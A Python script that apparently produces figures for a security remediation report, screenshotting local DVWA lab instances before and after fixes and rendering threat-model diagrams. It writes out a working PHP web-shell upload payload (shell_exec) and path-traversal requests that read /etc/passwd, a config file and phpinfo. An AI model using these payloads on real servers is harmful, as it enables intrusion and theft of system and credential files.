"""Рисунки для звіту: знімки екрана стендів «до» (8082) і «після» (8081), діаграми Mermaid, графік до/після.

    BEFORE_URL=http://127.0.0.1:8082 AFTER_URL=http://127.0.0.1:8081 python report/tools/make_figures.py
"""
from __future__ import annotations

import html
import json
import os
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / "tools"))
sys.path.insert(0, str(Path(__file__).parent))
import dvwa_client  # noqa: E402
from cdp import Chrome  # noqa: E402

FIG = ROOT / "report" / "figures"
BEFORE = os.environ.get("BEFORE_URL", "http://127.0.0.1:8082")
AFTER = os.environ.get("AFTER_URL", "http://127.0.0.1:8081")
PAYLOAD = '<?php echo "RGR-V8-" . (7*191) . " id: " . trim((string) shell_exec("id")); ?>'

UPLOAD_JS = """
(async () => {
  const fd = new FormData();
  fd.append('uploaded', new Blob([%(body)s], {type: %(ctype)s}), %(name)s);
  fd.append('Upload', 'Upload'); fd.append('MAX_FILE_SIZE', '100000');
  const r = await fetch('/vulnerabilities/upload/', {method: 'POST', body: fd, credentials: 'include'});
  const t = await r.text(); document.open(); document.write(t); document.close();
  await new Promise(res => setTimeout(res, 500)); return r.status;
})()
"""


def login(chrome: Chrome, base: str, level: str) -> None:
    c = dvwa_client.session(level, base)
    chrome.set_cookies(base + "/", {k: v for k, v in c.s.cookies.items()})


def upload(chrome: Chrome, base: str, name: str, body: str, ctype: str) -> None:
    chrome.goto(base + "/vulnerabilities/upload/")
    chrome.eval(UPLOAD_JS % {"body": json.dumps(body), "ctype": json.dumps(ctype), "name": json.dumps(name)},
                await_promise=True)


def dvwa_shots(chrome: Chrome) -> None:
    # ── «до» ──
    login(chrome, BEFORE, "low")
    upload(chrome, BEFORE, "rgr_fig_shell.php", PAYLOAD, "application/x-php")
    chrome.screenshot(FIG / "v1_upload_before.png", selector="div.body_padded")
    chrome.viewport(900, 160)
    chrome.goto(BEFORE + "/hackable/uploads/rgr_fig_shell.php")
    chrome.eval("document.body.style.cssText='font:18px monospace;padding:16px;margin:0'")
    chrome.screenshot(FIG / "v1_webshell_before.png", selector="body", pad=0)
    chrome.viewport(1200, 800)

    chrome.goto(BEFORE + "/vulnerabilities/fi/?page=../../../../../../etc/passwd")
    chrome.screenshot(FIG / "v4_passwd_before.png", selector="#main_body")

    login(chrome, BEFORE, "impossible")
    chrome.goto(BEFORE + "/vulnerabilities/view_source.php?id=fi&security=../../../config/config.inc")
    chrome.eval("window.scrollTo(0, 0)")
    chrome.screenshot(FIG / "v8_config_before.png", selector="div.body_padded")

    chrome.viewport(1200, 700)
    chrome.goto(BEFORE + "/vulnerabilities/view_help.php?id=fi&security=low&locale=x/../../../../phpinfo")
    chrome.screenshot(FIG / "v9_phpinfo_before.png")
    chrome.viewport(1200, 800)

    # ── «після» ──
    login(chrome, AFTER, "low")
    upload(chrome, AFTER, "rgr_fig_shell.php", PAYLOAD, "application/x-php")
    chrome.screenshot(FIG / "v1_upload_after.png", selector="div.body_padded")
    chrome.goto(AFTER + "/vulnerabilities/fi/?page=../../../../../../etc/passwd")
    chrome.eval("document.body.style.cssText='font:18px monospace;padding:16px;margin:0'")
    chrome.viewport(900, 120)
    chrome.screenshot(FIG / "v4_after.png", selector="body", pad=0)
    chrome.viewport(1200, 800)
    login(chrome, AFTER, "low")
    chrome.goto(AFTER + "/vulnerabilities/fi/?page=file1.php")
    chrome.screenshot(FIG / "fi_legit_after.png", selector="div.body_padded")


MERMAID_PAGE = """<!doctype html><html><head><meta charset="utf-8">
<script src="https://cdn.jsdelivr.net/npm/mermaid@11.4.1/dist/mermaid.min.js"></script>
<style>body{margin:0;background:#fff;font-family:'Times New Roman',serif} #d{display:inline-block;padding:12px}</style>
</head><body><div id="d"><pre class="mermaid">%s</pre></div>
<script>mermaid.initialize({startOnLoad:false, theme:'neutral', flowchart:{htmlLabels:true, curve:'basis'},
 themeVariables:{fontFamily:'Times New Roman, serif', fontSize:'16px'}});
mermaid.run().then(()=>document.body.dataset.done='1');</script></body></html>"""


def mermaid_shots(chrome: Chrome) -> None:
    tmp = ROOT / "report" / "build"
    tmp.mkdir(parents=True, exist_ok=True)
    for src, out, width in [("docs/threat-model/dfd.mmd", "dfd.png", 1600),
                            ("docs/threat-model/attack_tree.mmd", "attack_tree.png", 1800)]:
        text = (ROOT / src).read_text(encoding="utf-8")
        page = tmp / (Path(src).stem + ".html")
        page.write_text(MERMAID_PAGE % html.escape(text), encoding="utf-8")
        chrome.viewport(width, 900)
        chrome.goto(page.as_uri(), settle=0.2)
        for _ in range(100):
            if chrome.eval("document.body.dataset.done") == "1":
                break
            import time; time.sleep(0.1)
        chrome.screenshot(FIG / out, selector="#d svg", pad=4)
    chrome.viewport(1200, 800)


def main() -> int:
    chrome = Chrome()
    try:
        mermaid_shots(chrome)
        dvwa_shots(chrome)
    finally:
        chrome.close()
    for p in sorted(FIG.glob("*.png")):
        print(p.relative_to(ROOT), p.stat().st_size)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
